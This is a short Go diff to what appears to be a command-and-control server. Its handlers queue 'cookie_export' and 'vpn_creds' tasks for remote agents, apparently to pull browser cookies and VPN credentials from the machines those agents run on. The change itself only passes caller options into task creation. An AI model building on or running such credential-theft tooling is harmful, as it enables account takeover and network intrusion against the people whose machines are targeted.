@@ -27,7 +27,7 @@ func (s *Server) handleCookieExport(c *gin.Context) {
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
 	}
-	task, err := s.createTask(id, "cookie_export", browser, "", "", "", 0, 0)
+	task, err := s.createTask(id, "cookie_export", browser, "", "", "", 0, 0, callerOpts(c)...)
 	if err != nil {
 		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
@@ -45,7 +45,7 @@ func (s *Server) handleVpnCreds(c *gin.Context) {
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
 	}
-	task, err := s.createTask(id, "vpn_creds", "", "", "", "", 0, 0)
+	task, err := s.createTask(id, "vpn_creds", "", "", "", "", 0, 0, callerOpts(c)...)
 	if err != nil {
 		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
